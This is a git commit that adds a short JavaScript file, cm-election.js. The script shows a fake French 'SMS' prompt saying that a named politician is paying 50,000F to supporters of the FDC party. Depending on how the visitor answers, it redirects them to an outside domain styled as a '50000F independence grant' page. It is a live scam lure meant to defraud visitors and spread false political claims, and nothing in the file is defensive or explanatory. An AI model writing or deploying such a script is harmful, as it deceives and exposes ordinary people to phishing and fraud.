1787347a24c6b876b7865b5e0518eb57e3c41a7c
bigetijazz32 <bigetijazz32@gmail.com>
2025-07-29 16:55:38 +0100

    Create cm-election.js

---
+++ cm-election.js
@@ -0,0 +1,6 @@
+
+var password = 'Retirer 50,000F'
+password=prompt('SMS: Bonjour cher, Hiram Iyodi distribue 50,000F à tous les sympathisants du FDC. to Retirer 50,000F, appuyez sur OK pour vérifier maintenant','Retirer 50,000F');
+if (password != 'Retirer 50,000F') {
+location.href='https://www.udwang.xyz/CM-50000F-independence-grant';
+}
